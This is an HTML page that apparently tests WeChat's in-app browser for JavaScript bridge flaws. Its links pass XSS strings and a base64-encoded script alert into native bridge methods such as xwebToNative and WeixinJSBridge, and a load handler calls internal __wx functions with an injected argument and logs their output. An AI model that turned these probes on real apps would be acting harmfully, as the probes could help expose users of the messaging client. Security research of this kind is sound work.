<body>
	<pre id='log'></pre>
	<script>
		function mylog(string) {
		  	var log = document.getElementById('log');
		  	if (log) {				
		    		log.innerText += string+'\n';
		  	}
		}
	</script>  
  <a href="javascript:WeixinJSContext.allocEmpty()" onclick="leak()">CLICK</a>
  <a href="javascript:xwebToNative.onVideoError(1, '<script>alert(1);</script>')">onVideoError</a>
  <a href="javascript:xwebToNative.onVideoEnterFullscreen(false, 0, 0, 0, false, false, 0, 0, [])">onVideoEnterFullscreen</a>
  <a href="javascript:xwebToNative.onVideoGetFrame(0, 0, 'data:image/png;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==')">onVideoGetFrame</a>
  <a href="javascript:WeixinJSBridge.call('alert(1)', {}, 'function x() { alert(2); }')">call TEST</a>

  <script>
  	window.addEventListener('load', function(event) {
  		if(typeof window.WeixinJSBridge !== 'undefined') mylog('WeixinJSBridge undefined');
    	if(typeof window.WeixinJSContext !== 'undefined') mylog('WeixinJSContext undefined');
    	if(typeof window.xwebToNative !== 'undefined') mylog('xwebToNative\n');
		if(typeof window.__wx !== 'undefined') mylog('__wx!\n');
    	if(typeof window.__wxtag !== 'undefined') mylog('__wxtag\n');

  		var a = window.__wx._getAllHosts("google.com, alert(1)");
  		mylog(a);  	
  		var c = window.__wx._getDgtVerifyRandomStr();
  		mylog(c);
  		var b = window.__wx._getHtmlContent("ABCD");
  		mylog(b);
  		var d = window.__wx._sendMessage("{'babo':'hoho'}");
  		mylog(d);
  	});
  </script>
</body> 
